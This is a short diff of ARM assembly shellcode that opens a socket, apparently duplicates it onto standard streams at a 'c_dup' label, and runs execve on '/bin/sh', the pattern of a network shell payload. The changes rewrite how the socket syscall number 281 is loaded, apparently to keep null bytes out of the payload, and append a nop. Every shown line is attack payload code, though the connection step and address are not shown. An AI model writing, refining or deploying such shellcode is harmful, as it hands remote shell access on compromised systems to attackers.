@@ -11,7 +11,6 @@
 _start:
     // switch to thumb mode
     .code 32
-    ldr    r7, =#281
     ldr    r4, =#0xD402FF02 
     ldr    r5, =#0x6e69622f // /bin
     ldr    r6, =#0x68732f2f // //sh
@@ -22,6 +21,8 @@ _start:
     // s = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
     eor    r2, r2, r2   // r2 = IPPROTO_IP
     mov    r1, #1       // r1 = SOCK_STREAM
+    lsl    r7, r1, #8   // r7 = 256
+    add    r7, #25      // r7 = 281 = socket 
     mov    r0, #2       // r0 = AF_INET
     svc    1
     
@@ -68,3 +69,4 @@ c_dup:
     mov    r0, sp       // r0 = "/bin/sh" 
     mov    r7, #11      // r7 = execve
     svc    1
+    nop
